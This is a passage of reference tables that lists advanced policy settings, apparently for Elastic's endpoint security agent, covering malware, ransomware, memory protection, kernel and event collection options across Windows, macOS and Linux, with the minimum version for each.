| `windows.advanced.elasticsearch.tls.verify_hostname` | 7.9+ |
| `windows.advanced.elasticsearch.tls.ca_cert` | 7.9+ |

### Logging & Diagnostics
| Setting | Min Version |
|---|---|
| `windows.advanced.logging.file` | 7.11+ |
| `windows.advanced.logging.debugview` | 7.11+ |
| `windows.advanced.diagnostic.enabled` | 7.11+ |
| `windows.advanced.diagnostic.rollback_telemetry_enabled` | 8.1+ |

### Malware
| Setting | Min Version |
|---|---|
| `windows.advanced.malware.quarantine` | 7.9+ |
| `windows.advanced.malware.threshold` | 7.11+ |
| `windows.advanced.malware.max_file_size_bytes` | 8.16.4+ |
| `windows.advanced.malware.networkshare` | 8.9+ |

### Ransomware
| Setting | Min Version |
|---|---|
| `windows.advanced.ransomware.mbr` | 7.12+ |
| `windows.advanced.ransomware.canary` | 7.14+ |
| `windows.advanced.ransomware.dump_process` | 8.11+ |

### Memory Protection
| Setting | Min Version |
|---|---|
| `windows.advanced.memory_protection.shellcode` | 7.15+ |
| `windows.advanced.memory_protection.memory_scan` | 7.15+ |
| `windows.advanced.memory_protection.shellcode_collect_sample` | 7.15+ |
| `windows.advanced.memory_protection.memory_scan_collect_sample` | 7.15+ |
| `windows.advanced.memory_protection.shellcode_enhanced_pe_parsing` | 7.15+ |
| `windows.advanced.memory_protection.shellcode_trampoline_detection` | 8.1+ |
| `windows.advanced.memory_protection.context_manipulation_detection` | 8.4+ |
| `windows.advanced.memory_protection.scan_on_network_event` | 8.17.6+ |
| `windows.advanced.memory_protection.scan_on_api_event` | 8.17.6+ |
| `windows.advanced.memory_protection.scan_on_image_load_event` | 8.17.6+ |

### Kernel
| Setting | Min Version |
|---|---|
| `windows.advanced.kernel.connect` | 7.9+ |
| `windows.advanced.kernel.process` | 7.9+ |
| `windows.advanced.kernel.filewrite` | 7.9+ |
| `windows.advanced.kernel.filewrite_sync` | 8.14+ |
| `windows.advanced.kernel.network` | 7.9+ |
| `windows.advanced.kernel.network_report_loopback` | 8.15+ |
| `windows.advanced.kernel.fileopen` | 7.9+ |
| `windows.advanced.kernel.asyncimageload` | 7.9+ |
| `windows.advanced.kernel.syncimageload` | 7.9+ |
| `windows.advanced.kernel.registry` | 7.9+ |
| `windows.advanced.kernel.fileaccess` | 7.15+ |
| `windows.advanced.kernel.registryaccess` | 7.15+ |
| `windows.advanced.kernel.process_handle` | 8.1+ |
| `windows.advanced.kernel.image_and_process_file_timestamp` | 8.4+ |
| `windows.advanced.kernel.ppl.harden_images` | 8.9+ |
| `windows.advanced.kernel.ppl.harden_am_images` | 8.9+ |
| `windows.advanced.kernel.dev_drives.harden` | 8.16+ |

### Events — Collection & Callstacks
| Setting | Min Version | Notes |
|---|---|---|
| `windows.advanced.events.etw` | 8.1+ | ETW provider opt-in |
| `windows.advanced.events.api` | 8.8+ | API event collection |
| `windows.advanced.events.api_disabled` | 8.11+ | |
| `windows.advanced.events.api_verbose` | 8.11+ | |
| `windows.advanced.events.callstacks.emit_in_events` | 8.8+ | Attach callstacks to raw events |
| `windows.advanced.events.callstacks.process` | 8.8+ | Callstacks on process events |
| `windows.advanced.events.callstacks.image_load` | 8.8+ | Callstacks on DLL load events |
| `windows.advanced.events.callstacks.file` | 8.8+ | Callstacks on file events |
| `windows.advanced.events.callstacks.registry` | 8.8+ | Callstacks on registry events |
| `windows.advanced.events.callstacks.timeout_microseconds` | 8.12+ | |
| `windows.advanced.events.callstacks.use_hardware` | 8.16+ | |
| `windows.advanced.events.callstacks.exclude_hotpatch_extension_pages` | 8.15.2+ | |
| `windows.advanced.events.callstacks.include_network_images` | 8.9+ | |
| `windows.advanced.events.check_debug_registers` | 8.11+ | |
| `windows.advanced.events.process_ancestry_length` | 8.15+ | |
| `windows.advanced.events.ancestry_in_all_events` | 8.15+ | Inject ancestry into every event type |
| `windows.advanced.events.aggregate_process` | 8.16+ | |
| `windows.advanced.events.aggregate_network` | 8.18+ | |
| `windows.advanced.events.deduplicate_network_events` | 8.15+ | |
| `windows.advanced.events.deduplicate_network_events_below_bytes` | 8.15+ | |
| `windows.advanced.events.network_events_exclude_local` | 8.10.1+ | |
| `windows.advanced.events.capture_command_line` | 8.14+ | |
| `windows.advanced.events.enforce_registry_filters` | 8.15+ | |
| `windows.advanced.events.disable_registry_write_suppression` | 8.12.1+ | |
| `windows.advanced.events.disable_image_load_suppression_cache` | 8.12.1+ | |
| `windows.advanced.events.process.creation_flags` | 8.13+ | |
| `windows.advanced.events.process.origin_info_collection` | 8.19+ | |
| `windows.advanced.events.memory_scan` | 8.14+ | |
| `windows.advanced.events.event_on_access.file_paths` | 8.15+ | |
| `windows.advanced.events.event_on_access.registry_paths` | 8.15+ | Targeted registry path monitoring |
| `windows.advanced.events.image_load.origin_info_collection` | 8.19+ | |
| `windows.advanced.events.file.origin_info_collection` | 8.19+ | |
| `windows.advanced.events.file.max_hash_size_mb` | 8.16+ | |
| `windows.advanced.events.security.provider_etw` | 8.19+ | |
| `windows.advanced.events.security.event_disabled` | 9.2+ | |

### Hashing
| Setting | Min Version |
|---|---|
| `windows.advanced.events.hash.md5` | 8.16+ |
| `windows.advanced.events.hash.sha1` | 8.16+ |
| `windows.advanced.events.hash.sha256` | 8.16+ |
| `windows.advanced.alerts.hash.md5` | 8.16+ |
| `windows.advanced.alerts.hash.sha1` | 8.16+ |

### Alerts
| Setting | Min Version |
|---|---|
| `windows.advanced.alerts.cloud_lookup` | 7.12+ |
| `windows.advanced.alerts.rollback.self_healing.registry_enabled` | 8.8+ |
| `windows.advanced.alerts.sample_collection` | 8.13+ |

### Mitigations & Protection
| Setting | Min Version |
|---|---|
| `windows.advanced.mitigations.policies.redirection_guard` | 9.3+ |
| `windows.advanced.firewall_anti_tamper` | 9.2+ |
| `windows.advanced.device_control.filter_images` | 9.2+ |
| `windows.advanced.harden_images` | — |

### Misc
| Setting | Min Version |
|---|---|
| `windows.advanced.allow_cloud_features` | 8.18+ |
| `windows.advanced.utilization_limits.cpu` | 8.3+ |
| `windows.advanced.utilization_limits.resident_memory_target_mb` | 8.12+ |
| `windows.advanced.utilization_limits.free_disk_space_gb` | 9.3+ |
| `windows.advanced.utilization_limits.free_disk_space_percent` | 9.3+ |
| `windows.advanced.event_filter.default` | 8.3+ |
| `windows.advanced.document_enrichment.fields` | 8.11+ |
| `windows.advanced.set_extended_host_information` | 8.16+ |
| `windows.advanced.flags` | 8.13+ |
| `windows.advanced.response_actions.get_file.max_parallel_uploads` | 9.3+ |
| `windows.advanced.response_actions.get_file.upload_streams_count` | 9.3+ |

---

## macOS

### Agent & Connectivity
| Setting | Min Version |
|---|---|
| `mac.advanced.agent.connection_delay` | 7.9+ |
| `mac.advanced.agent.orphaned_remediation` | 9.2+ |

### Artifacts
| Setting | Min Version |
|---|---|
| `mac.advanced.artifacts.global.base_url` | 7.9+ |
| `mac.advanced.artifacts.global.manifest_relative_url` | 7.9+ |
| `mac.advanced.artifacts.global.public_key` | 7.9+ |
| `mac.advanced.artifacts.global.interval` | 7.9+ |
| `mac.advanced.artifacts.global.channel` | 8.18+ |
| `mac.advanced.artifacts.global.ca_cert` | 7.9+ |
| `mac.advanced.artifacts.global.proxy_url` | 8.8+ |
| `mac.advanced.artifacts.global.proxy_disable` | 8.8+ |
| `mac.advanced.artifacts.user.public_key` | 7.9+ |
| `mac.advanced.artifacts.user.ca_cert` | 7.9+ |
| `mac.advanced.artifacts.user.proxy_url` | 8.8+ |
| `mac.advanced.artifacts.user.proxy_disable` | 8.8+ |

### Elasticsearch
| Setting | Min Version |
|---|---|
| `mac.advanced.elasticsearch.delay` | 7.9+ |
| `mac.advanced.elasticsearch.tls.verify_peer` | 7.9+ |
| `mac.advanced.elasticsearch.tls.verify_hostname` | 7.9+ |
| `mac.advanced.elasticsearch.tls.ca_cert` | 7.9+ |

### Logging & Diagnostics
| Setting | Min Version |
|---|---|
| `mac.advanced.logging.file` | 7.11+ |
| `mac.advanced.logging.syslog` | 7.11+ |
| `mac.advanced.diagnostic.enabled` | 7.12+ |

### Malware
| Setting | Min Version |
|---|---|
| `mac.advanced.malware.quarantine` | 7.9+ |
| `mac.advanced.malware.threshold` | 7.11+ |
| `mac.advanced.malware.max_file_size_bytes` | 8.16.4+ |

### Ransomware
| Setting | Min Version |
|---|---|
| `mac.advanced.ransomware.diagnostic` | 9.2+ |

### Memory Protection
| Setting | Min Version |
|---|---|
| `mac.advanced.memory_protection.memory_scan` | 7.16+ |
| `mac.advanced.memory_protection.memory_scan_collect_sample` | 7.16+ |
| `mac.advanced.memory_protection.scan_on_network_event` | 8.17.6+ |

### Kernel
| Setting | Min Version |
|---|---|
| `mac.advanced.kernel.connect` | 7.9+ |
| `mac.advanced.kernel.process` | 7.9+ |
| `mac.advanced.kernel.filewrite` | 7.9+ |
| `mac.advanced.kernel.network` | 7.9+ |
| `mac.advanced.kernel.fileaccess` | 8.11+ |
| `mac.advanced.kernel.harden.self_protect` | 7.11+ |
| `mac.advanced.kernel.network_extension.enable_content_filtering` | 8.1+ |
| `mac.advanced.kernel.network_extension.enable_packet_filtering` | 8.1+ |

### Events
| Setting | Min Version |
|---|---|
| `mac.advanced.events.populate_file_data` | 9.2+ |
| `mac.advanced.events.process_ancestry_length` | 8.15+ |
| `mac.advanced.events.ancestry_in_all_events` | 8.15+ |
| `mac.advanced.events.aggregate_process` | 8.16+ |
| `mac.advanced.events.aggregate_network` | 8.18+ |
| `mac.advanced.events.deduplicate_network_events` | 8.15+ |
| `mac.advanced.events.deduplicate_network_events_below_bytes` | 8.15+ |
| `mac.advanced.events.network_events_exclude_local` | 8.10.1+ |
| `mac.advanced.events.capture_command_line` | 8.14+ |
| `mac.advanced.events.capture_env_vars` | 8.7+ |
| `mac.advanced.events.image_load` | 8.11+ |
| `mac.advanced.events.event_on_access.file_paths` | 8.15+ |
| `mac.advanced.events.file.max_hash_size_mb` | 8.16+ |
| `mac.advanced.events.script_capture` | 9.3+ |
| `mac.advanced.events.script_max_size` | 9.3+ |

### Image Load
| Setting | Min Version |
|---|---|
| `mac.advanced.image_load.capture` | 8.11+ |

### Hashing
| Setting | Min Version |
|---|---|
| `mac.advanced.events.hash.md5` | 8.16+ |
| `mac.advanced.events.hash.sha1` | 8.16+ |
| `mac.advanced.events.hash.sha256` | 8.16+ |
| `mac.advanced.alerts.hash.md5` | 8.16+ |
| `mac.advanced.alerts.hash.sha1` | 8.16+ |

### Alerts
| Setting | Min Version |
|---|---|
| `mac.advanced.alerts.cloud_lookup` | 7.12+ |
| `mac.advanced.alerts.sample_collection` | 8.13+ |

### Misc
| Setting | Min Version |
|---|---|
| `mac.advanced.allow_cloud_features` | 8.18+ |
| `mac.advanced.event_filter.default` | 8.3+ |
| `mac.advanced.document_enrichment.fields` | 8.11+ |
| `mac.advanced.set_extended_host_information` | 8.16+ |
| `mac.advanced.flags` | 8.16+ |
| `mac.advanced.device_control.filter_images` | 9.2+ |
| `mac.advanced.utilization_limits.free_disk_space_gb` | 9.3+ |
| `mac.advanced.utilization_limits.free_disk_space_percent` | 9.3+ |
| `mac.advanced.response_actions.get_file.max_parallel_uploads` | 9.3+ |
| `mac.advanced.response_actions.get_file.upload_streams_count` | 9.3+ |
| `mac.advanced.file_cache.file_object_cache_size` | 8.12+ |

---

## Linux

### Agent & Connectivity
| Setting | Min Version |
|---|---|
| `linux.advanced.agent.connection_delay` | 7.9+ |
| `linux.advanced.agent.orphaned_remediation` | 9.2+ |

### Artifacts
| Setting | Min Version |
|---|---|
| `linux.advanced.artifacts.global.base_url` | 7.9+ |
| `linux.advanced.artifacts.global.manifest_relative_url` | 7.9+ |
| `linux.advanced.artifacts.global.public_key` | 7.9+ |
| `linux.advanced.artifacts.global.interval` | 7.9+ |
| `linux.advanced.artifacts.global.channel` | 8.18+ |
| `linux.advanced.artifacts.global.ca_cert` | 7.9+ |
| `linux.advanced.artifacts.global.proxy_url` | 8.8+ |
| `linux.advanced.artifacts.global.proxy_disable` | 8.8+ |
| `linux.advanced.artifacts.user.public_key` | 7.9+ |
| `linux.advanced.artifacts.user.ca_cert` | 7.9+ |
| `linux.advanced.artifacts.user.proxy_url` | 8.8+ |
| `linux.advanced.artifacts.user.proxy_disable` | 8.8+ |

### Elasticsearch
| Setting | Min Version |
|---|---|
| `linux.advanced.elasticsearch.delay` | 7.9+ |
| `linux.advanced.elasticsearch.tls.verify_peer` | 7.9+ |
| `linux.advanced.elasticsearch.tls.verify_hostname` | 7.9+ |
| `linux.advanced.elasticsearch.tls.ca_cert` | 7.9+ |

### Logging & Diagnostics
| Setting | Min Version |
|---|---|
| `linux.advanced.logging.file` | 7.11+ |
| `linux.advanced.logging.syslog` | 7.11+ |
| `linux.advanced.diagnostic.enabled` | 7.12+ |

### Malware
| Setting | Min Version |
|---|---|
| `linux.advanced.malware.quarantine` | 7.14+ |
| `linux.advanced.malware.max_file_size_bytes` | 8.16.4+ |

### Ransomware
| Setting | Min Version |
|---|---|
| `linux.advanced.ransomware.diagnostic` | 9.4+ |

### Memory Protection
| Setting | Min Version |
|---|---|
| `linux.advanced.memory_protection.memory_scan` | 7.16+ |
| `linux.advanced.memory_protection.memory_scan_collect_sample` | 7.16+ |
| `linux.advanced.memory_protection.enable_fork_scan` | 8.14+ |
| `linux.advanced.memory_protection.enable_shared_dirty_scan` | 8.14+ |
| `linux.advanced.memory_protection.scan_on_network_event` | 8.17.6+ |

### Kernel & fanotify
| Setting | Min Version |
|---|---|
| `linux.advanced.kernel.capture_mode` | 8.2+ |
| `linux.advanced.fanotify.ignore_unknown_filesystems` | 8.4+ |
| `linux.advanced.fanotify.monitored_filesystems` | 8.4+ |
| `linux.advanced.fanotify.ignored_filesystems` | 8.4+ |
| `linux.advanced.fanotify.seccomp_restricted` | 8.13.1+ |
| `linux.advanced.fanotify.enable_ns_jumping` | 9.3+ |

### Events
| Setting | Min Version |
|---|---|
| `linux.advanced.events.populate_file_data` | 9.3+ |
| `linux.advanced.events.process_ancestry_length` | 8.15+ |
| `linux.advanced.events.ancestry_in_all_events` | 8.15+ |
| `linux.advanced.events.aggregate_process` | 8.16+ |
| `linux.advanced.events.aggregate_network` | 8.18+ |
| `linux.advanced.events.deduplicate_network_events` | 8.15+ |
| `linux.advanced.events.deduplicate_network_events_below_bytes` | 8.15+ |
| `linux.advanced.events.network_events_exclude_local` | 8.10.1+ |
| `linux.advanced.events.capture_command_line` | 8.14+ |
| `linux.advanced.capture_env_vars` | 8.6+ |
| `linux.advanced.events.disable_fd_kprobes` | 8.8+ |
| `linux.advanced.events.enable_caps` | 8.14+ |
| `linux.advanced.events.file.max_hash_size_mb` | 8.16+ |
| `linux.advanced.host_isolation.allowed` | 8.6.1+ |

### TTY / Session
| Setting | Min Version |
|---|---|
| `linux.advanced.tty_io.max_kilobytes_per_process` | 8.5+ |
| `linux.advanced.tty_io.max_kilobytes_per_event` | 8.5+ |
| `linux.advanced.tty_io.max_event_interval_seconds` | 8.5+ |

### Hashing
| Setting | Min Version |
|---|---|
| `linux.advanced.events.hash.md5` | 8.16+ |
| `linux.advanced.events.hash.sha1` | 8.16+ |
| `linux.advanced.events.hash.sha256` | 8.16+ |
| `linux.advanced.alerts.hash.md5` | 8.16+ |
| `linux.advanced.alerts.hash.sha1` | 8.16+ |

### Alerts
| Setting | Min Version |
|---|---|
| `linux.advanced.alerts.sample_collection` | 8.13+ |

### Misc
| Setting | Min Version |
|---|---|
| `linux.advanced.allow_cloud_features` | 8.18+ |
| `linux.advanced.event_filter.default` | 8.3+ |
| `linux.advanced.document_enrichment.fields` | 8.11+ |
| `linux.advanced.set_extended_host_information` | 8.16+ |
| `linux.advanced.flags` | 8.16+ |
| `linux.advanced.utilization_limits.cpu` | 8.3+ |
| `linux.advanced.utilization_limits.free_disk_space_gb` | 9.3+ |
| `linux.advanced.utilization_limits.free_disk_space_percent` | 9.3+ |
| `linux.advanced.file_cache.file_object_cache_size` | 8.12+ |
| `linux.advanced.response_actions.get_file.max_parallel_uploads` | 9.3+ |
| `linux.advanced.response_actions.get_file.upload_streams_count` | 9.3+ |
| `linux.advanced.memory_protection.scan_on_network_event` | 8.17.6+ |
